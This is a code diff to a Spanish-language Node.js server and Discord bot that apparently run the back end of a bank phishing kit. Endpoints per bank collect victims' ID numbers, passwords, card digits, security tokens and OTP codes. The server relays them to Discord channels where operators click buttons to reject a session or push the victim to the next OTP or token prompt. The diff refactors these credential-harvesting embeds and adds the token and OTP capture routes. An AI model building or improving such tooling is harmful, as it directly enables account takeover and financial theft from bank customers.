@@ -13,7 +13,7 @@ const HTTP_PORT = process.env.PORT || 3000;
 // ESTADO DE LAS SESIONES
 // ============================================
 const estadoSesiones = new Map();
-// Guardamos los datos completos de cada sesión para poder reusarlos al cambiar de embed
+// Datos completos de cada sesión (identificacion, clave, tipo, etc.)
 const datosSesiones = new Map();
 
 // ============================================
@@ -36,19 +36,15 @@ client.once(Events.ClientReady, (c) => {
 });
 
 // ============================================
-// FUNCIONES AUXILIARES
+// HELPERS — Construir embeds y botones
 // ============================================
 
-// Construye el embed según el estado
-function buildEmbed(banco, bancoKey, datos, sessionId, estado) {
-    const { tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
-
-    let titulo = `${banco.nombre} - Nuevo registro`;
-    if (estado === 'otp') titulo = `${banco.nombre} - Verificación OTP`;
-    if (estado === 'token') titulo = `${banco.nombre} - Verificación Token`;
+// Embed inicial (cédula + contraseña) — 3 botones
+function buildEmbedInicial(banco, bancoKey, datos, sessionId) {
+    const { tipo, tipoDoc, identificacion, clave, tarjeta } = datos;
 
     const embed = new EmbedBuilder()
-        .setTitle(titulo)
+        .setTitle(`${banco.nombre} - Nuevo registro`)
         .setColor(banco.color)
         .addFields(
             { name: '🎫 Tipo', value: tipo || 'N/A', inline: false },
@@ -58,7 +54,6 @@ function buildEmbed(banco, bancoKey, datos, sessionId, estado) {
 
     if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
     if (tarjeta) embed.addFields({ name: '💳 Últ. 4 dígitos', value: tarjeta, inline: true });
-    if (token) embed.addFields({ name: '🔐 Token', value: token, inline: false });
 
     const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
@@ -67,55 +62,96 @@ function buildEmbed(banco, bancoKey, datos, sessionId, estado) {
     return embed;
 }
 
-// Construye los botones según el estado
-function buildButtons(bancoKey, sessionId, estado) {
-    if (estado === 'inicial') {
-        // 3 botones: Rechazar / OTP / Token
-        return new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
-                .setLabel('❌ Rechazar')
-                .setStyle(ButtonStyle.Danger),
-            new ButtonBuilder()
-                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
-                .setLabel('📱 OTP')
-                .setStyle(ButtonStyle.Primary),
-            new ButtonBuilder()
-                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
-                .setLabel('🔢 Token')
-                .setStyle(ButtonStyle.Success)
-        );
-    }
+// Embed del TOKEN (cédula + clave + token) — 2 botones: Rechazar / OTP
+function buildEmbedToken(banco, bancoKey, datos, sessionId, tokenValor) {
+    const { tipoDoc, identificacion, clave } = datos;
 
-    if (estado === 'otp') {
-        // 2 botones: Rechazar / Token
-        return new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
-                .setLabel('❌ Rechazar')
-                .setStyle(ButtonStyle.Danger),
-            new ButtonBuilder()
-                .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
-                .setLabel('🔢 Token')
-                .setStyle(ButtonStyle.Success)
+    const embed = new EmbedBuilder()
+        .setTitle(`${banco.nombre} - Verificación Token`)
+        .setColor(banco.color)
+        .addFields(
+            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
+            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
         );
-    }
 
-    if (estado === 'token') {
-        // 2 botones: Rechazar / OTP
-        return new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
-                .setLabel('❌ Rechazar')
-                .setStyle(ButtonStyle.Danger),
-            new ButtonBuilder()
-                .setCustomId(`OTP|${bancoKey}|${sessionId}`)
-                .setLabel('📱 OTP')
-                .setStyle(ButtonStyle.Primary)
+    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
+
+    embed.addFields({ name: '🔢 Token', value: `\`${tokenValor}\``, inline: false });
+
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
+    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
+
+    return embed;
+}
+
+// Embed del OTP (cédula + clave + otp) — 2 botones: Rechazar / Token
+function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
+    const { tipoDoc, identificacion, clave } = datos;
+
+    const embed = new EmbedBuilder()
+        .setTitle(`${banco.nombre} - Verificación OTP`)
+        .setColor(banco.color)
+        .addFields(
+            { name: '📋 Tipo doc', value: tipoDoc || '(no seleccionado)', inline: true },
+            { name: '🪪 Identificación', value: identificacion || '(vacío)', inline: true }
         );
-    }
 
-    return null;
+    if (clave) embed.addFields({ name: '🔑 Clave', value: clave, inline: true });
+
+    embed.addFields({ name: '📱 OTP', value: `\`${otpValor}\``, inline: false });
+
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    embed.addFields({ name: '🕒 Fecha', value: fecha, inline: false });
+    embed.setFooter({ text: `Sesión: ${sessionId} | ${bancoKey}` });
+
+    return embed;
+}
+
+// 3 botones: Rechazar / OTP / Token
+function buildButtonsInicial(bancoKey, sessionId) {
+    return new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+            .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+            .setLabel('❌ Rechazar')
+            .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+            .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+            .setLabel('📱 OTP')
+            .setStyle(ButtonStyle.Primary),
+        new ButtonBuilder()
+            .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+            .setLabel('🔢 Token')
+            .setStyle(ButtonStyle.Success)
+    );
+}
+
+// 2 botones: Rechazar / OTP (para embed de Token)
+function buildButtonsToken(bancoKey, sessionId) {
+    return new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+            .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+            .setLabel('❌ Rechazar')
+            .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+            .setCustomId(`OTP|${bancoKey}|${sessionId}`)
+            .setLabel('📱 OTP')
+            .setStyle(ButtonStyle.Primary)
+    );
+}
+
+// 2 botones: Rechazar / Token (para embed de OTP)
+function buildButtonsOtp(bancoKey, sessionId) {
+    return new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+            .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
+            .setLabel('❌ Rechazar')
+            .setStyle(ButtonStyle.Danger),
+        new ButtonBuilder()
+            .setCustomId(`TOKEN|${bancoKey}|${sessionId}`)
+            .setLabel('🔢 Token')
+            .setStyle(ButtonStyle.Success)
+    );
 }
 
 // ============================================
@@ -145,7 +181,7 @@ const server = http.createServer(async (req, res) => {
         req.on('end', async () => {
             try {
                 const datos = JSON.parse(body);
-                const { sessionId } = datos;
+                const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
 
                 if (!sessionId) {
                     res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -154,12 +190,12 @@ const server = http.createServer(async (req, res) => {
                 }
 
                 estadoSesiones.set(sessionId, 'pendiente');
-                datosSesiones.set(sessionId, datos);
+                datosSesiones.set(sessionId, { tipo, tipoDoc, identificacion, clave, tarjeta, token });
 
                 console.log(`📥 [${bancoKey}] Nueva sesión: ${sessionId}`);
 
-                const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'inicial');
-                const row = buildButtons(bancoKey, sessionId, 'inicial');
+                const embed = buildEmbedInicial(banco, bancoKey, datos, sessionId);
+                const row = buildButtonsInicial(bancoKey, sessionId);
 
                 const channel = await client.channels.fetch(banco.canalId);
                 await channel.send({ embeds: [embed], components: [row] });
@@ -169,6 +205,109 @@ const server = http.createServer(async (req, res) => {
                 res.end(JSON.stringify({ ok: true, sessionId }));
             } catch (err) {
                 console.error(`❌ [${bancoKey}] Error /enviar:`, err);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ─── POST /:banco/enviar-token ────────────────
+    const tokenMatch = req.url.match(/^\/([a-z-]+)\/enviar-token$/);
+    if (req.method === 'POST' && tokenMatch) {
+        const bancoKey = tokenMatch[1];
+        const banco = bancos[bancoKey];
+
+        if (!banco) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ ok: false, error: 'Banco no existe' }));
+            return;
+        }
+
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const datos = JSON.parse(body);
+                const { sessionId, token } = datos;
+
+                if (!sessionId || !token) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ ok: false, error: 'sessionId y token requeridos' }));
+                    return;
+                }
+
+                // Recuperar datos de la sesión original
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                // Actualizar con el token nuevo
+                const datosCompletos = Object.assign({}, datosOriginales, { token });
+                datosSesiones.set(sessionId, datosCompletos);
+
+                // Estado: token
+                estadoSesiones.set(sessionId, 'token');
+                console.log(`🔢 [${bancoKey}] Token recibido: ${sessionId} → ${token}`);
+
+                const embed = buildEmbedToken(banco, bancoKey, datosCompletos, sessionId, token);
+                const row = buildButtonsToken(bancoKey, sessionId);
+
+                const channel = await client.channels.fetch(banco.canalId);
+                await channel.send({ embeds: [embed], components: [row] });
+
+                console.log(`📨 [${bancoKey}] Embed Token enviado`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true }));
+            } catch (err) {
+                console.error(`❌ [${bancoKey}] Error /enviar-token:`, err);
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: err.message }));
+            }
+        });
+        return;
+    }
+
+    // ─── POST /:banco/enviar-otp ──────────────────
+    const otpMatch = req.url.match(/^\/([a-z-]+)\/enviar-otp$/);
+    if (req.method === 'POST' && otpMatch) {
+        const bancoKey = otpMatch[1];
+        const banco = bancos[bancoKey];
+
+        if (!banco) {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ ok: false, error: 'Banco no existe' }));
+            return;
+        }
+
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const datos = JSON.parse(body);
+                const { sessionId, otp } = datos;
+
+                if (!sessionId || !otp) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ ok: false, error: 'sessionId y otp requeridos' }));
+                    return;
+                }
+
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosOriginales, { otp });
+                datosSesiones.set(sessionId, datosCompletos);
+
+                estadoSesiones.set(sessionId, 'otp');
+                console.log(`📱 [${bancoKey}] OTP recibido: ${sessionId} → ${otp}`);
+
+                const embed = buildEmbedOtp(banco, bancoKey, datosCompletos, sessionId, otp);
+                const row = buildButtonsOtp(bancoKey, sessionId);
+
+                const channel = await client.channels.fetch(banco.canalId);
+                await channel.send({ embeds: [embed], components: [row] });
+
+                console.log(`📨 [${bancoKey}] Embed OTP enviado`);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true }));
+            } catch (err) {
+                console.error(`❌ [${bancoKey}] Error /enviar-otp:`, err);
                 res.writeHead(500, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ ok: false, error: err.message }));
             }
@@ -222,61 +361,26 @@ client.on(Events.InteractionCreate, async (interaction) => {
 
     console.log(`🔘 Botón pulsado: ${interaction.customId}`);
 
-    // customId = "ACCION|bancoKey|sessionId"
     const partes = interaction.customId.split('|');
     const accion = partes[0];
     const bancoKey = partes[1];
     const sessionId = partes[2];
     const usuario = interaction.user.username;
 
-    const banco = bancos[bancoKey];
-    if (!banco) {
-        await interaction.reply({ content: '❌ Banco no válido', ephemeral: true });
-        return;
-    }
-
-    const datos = datosSesiones.get(sessionId) || {};
-
     if (accion === 'RECHAZAR') {
         estadoSesiones.set(sessionId, 'rechazado');
         console.log(`❌ [${bancoKey}] RECHAZADO: ${sessionId}`);
-
-        // Editar el embed para mostrar que fue rechazado
-        const embedRechazado = buildEmbed(banco, bancoKey, datos, sessionId, 'inicial')
-            .setTitle(`${banco.nombre} - ❌ Rechazado`)
-            .setColor(0xC20024);
-
-        await interaction.update({
-            content: `❌ Sesión **${sessionId}** rechazada por ${usuario}`,
-            embeds: [embedRechazado],
-            components: []
-        });
+        await interaction.reply({ content: `❌ Sesión **${sessionId}** RECHAZADA por ${usuario}` });
 
     } else if (accion === 'OTP') {
         estadoSesiones.set(sessionId, 'otp');
         console.log(`📱 [${bancoKey}] OTP: ${sessionId}`);
-
-        const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'otp');
-        const row = buildButtons(bancoKey, sessionId, 'otp');
-
-        await interaction.update({
-            content: `📱 Sesión **${sessionId}** movida a OTP por ${usuario}`,
-            embeds: [embed],
-            components: [row]
-        });
+        await interaction.reply({ content: `📱 Sesión **${sessionId}** enviada a OTP por ${usuario}` });
 
     } else if (accion === 'TOKEN') {
         estadoSesiones.set(sessionId, 'token');
         console.log(`🔢 [${bancoKey}] TOKEN: ${sessionId}`);
-
-        const embed = buildEmbed(banco, bancoKey, datos, sessionId, 'token');
-        const row = buildButtons(bancoKey, sessionId, 'token');
-
-        await interaction.update({
-            content: `🔢 Sesión **${sessionId}** movida a TOKEN por ${usuario}`,
-            embeds: [embed],
-            components: [row]
-        });
+        await interaction.reply({ content: `🔢 Sesión **${sessionId}** enviada a TOKEN por ${usuario}` });
     }
 });
 
